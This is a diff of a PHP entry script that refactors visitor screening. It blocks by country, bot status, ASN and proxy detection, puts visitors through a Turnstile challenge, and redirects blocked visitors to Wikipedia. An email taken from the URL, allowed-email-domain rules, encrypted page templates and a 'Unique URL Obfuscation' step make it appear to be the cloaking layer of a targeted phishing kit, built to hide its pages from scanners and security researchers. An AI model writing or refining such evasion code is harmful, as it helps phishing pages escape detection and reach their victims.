@@ -94,65 +94,46 @@ $isAdmin = ($requestPath === '/admin.html' || strpos($requestPath, '/admin.html/
 $routeData = App\Router::handle();
 $email = $routeData['email'];
 $ip = App\Security::getClientIp();
-// App\Security::log("DEBUG: Request received from IP=$ip | Path=$requestPath");
 
-// A. Initial Security Check (Whitelist, Country, Bots)
-// We check intelligence later to save API credits if Turnstile is enabled
-$blockReason = ($isAdmin || $isApi) ? null : App\Security::enforceAccess($cfg, $email, false);
-$blocked = ($blockReason !== null);
-
-if ($blocked) {
-    App\Security::log("BLOCKED (Pre-Turnstile): IP=$ip | REASON=$blockReason");
+$blockVisitor = function($reason, $label) use ($ip) {
+    App\Security::log("BLOCKED ($label): IP=$ip | REASON=$reason");
     $emailReasons = ['blocked_email_domain', 'email_domain_not_allowed'];
-    if (!in_array($blockReason, $emailReasons, true)) {
+    if (!in_array($reason, $emailReasons, true)) {
         header('Location: https://www.wikipedia.org', true, 302);
         exit;
     }
-} else {
-    // App\Security::log("DEBUG: Passed security check for IP=$ip");
+};
+
+// Light check first (saves API credits). Heavy checks only after Turnstile.
+$isVisitor = !($isAdmin || $isApi);
+if ($isVisitor) {
+    $reason = App\Security::enforceAccess($cfg, $email, false);
+    if ($reason) $blockVisitor($reason, 'Pre-Turnstile');
 }
 
-// B. Cloudflare Turnstile Verification
-// Exempt Admin and API routes, and only trigger if Turnstile is enabled and Site Key is present
-if (!$isAdmin && !$isApi && !empty($cfg['cfTurnstileEnabled']) && empty($_SESSION['turnstile_verified'])) {
+// Turnstile challenge for non-admin visitors
+if ($isVisitor && !empty($cfg['cfTurnstileEnabled']) && empty($_SESSION['turnstile_verified'])) {
     $siteKey = $cfg['cfSiteKey'] ?? '';
     if (!empty($siteKey)) {
         header('Content-Type: text/html; charset=UTF-8');
         $html = App\Crypto::loadEncrypted(__DIR__ . '/templates/challenge.html.enc');
-        
-        // Fallback to plain challenge template if encrypted doesn't exist
         if ($html === false) {
-            $plainChallenge = __DIR__ . '/templates/plain/challenge.html';
-            if (file_exists($plainChallenge)) {
-                $html = file_get_contents($plainChallenge);
-            } else {
-                App\Security::log("ERROR: Challenge template not found (encrypted or plain).");
-            }
+            $plain = __DIR__ . '/templates/plain/challenge.html';
+            $html = file_exists($plain) ? file_get_contents($plain) : false;
         }
-        
         if ($html) {
-            $html = str_replace('SERVER_INJECT_SITE_KEY', htmlspecialchars($siteKey, ENT_QUOTES, 'UTF-8'), $html);
-            
-            echo $html;
+            echo str_replace('SERVER_INJECT_SITE_KEY', htmlspecialchars($siteKey, ENT_QUOTES, 'UTF-8'), $html);
             exit;
         }
     } else {
-        App\Security::log("WARNING: Turnstile enabled but cfSiteKey is missing. Skipping challenge.");
+        App\Security::log("WARNING: Turnstile enabled but cfSiteKey is missing.");
     }
 }
 
-// C. Heavy Security Check (ASN Blocking, ProxyCheck)
-// Only performed for verified humans (if Turnstile is enabled)
-$blockReason = ($isAdmin || $isApi) ? null : App\Security::enforceAccess($cfg, $email, true);
-$blocked = ($blockReason !== null);
-
-if ($blocked) {
-    App\Security::log("BLOCKED (Post-Turnstile): IP=$ip | REASON=$blockReason");
-    $emailReasons = ['blocked_email_domain', 'email_domain_not_allowed'];
-    if (!in_array($blockReason, $emailReasons, true)) {
-        header('Location: https://www.wikipedia.org', true, 302);
-        exit;
-    }
+// Heavy checks (only for verified/returning humans)
+if ($isVisitor) {
+    $reason = App\Security::enforceAccess($cfg, $email, true);
+    if ($reason) $blockVisitor($reason, 'Post-Turnstile');
 }
 
 // --- 4. Unique URL Obfuscation ---
